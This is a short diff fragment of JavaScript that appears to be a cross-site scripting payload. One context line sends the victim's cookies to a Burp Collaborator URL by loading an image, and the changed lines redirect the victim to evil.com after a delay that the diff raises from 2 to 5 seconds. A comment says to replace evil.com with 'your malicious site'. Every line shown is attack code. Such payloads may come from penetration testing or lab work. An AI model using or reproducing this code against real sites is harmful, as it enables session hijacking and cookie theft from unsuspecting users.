@@ -15,4 +15,4 @@ img.src = burpCollaboratorURL + "/?cookie=" + encodeURIComponent(cookies);
 // Redirect the victim to another site after 2 seconds
 setTimeout(function() {
     window.location.href = "https://evil.com"; // Replace with your malicious site
-}, 2000);
+}, 5000);
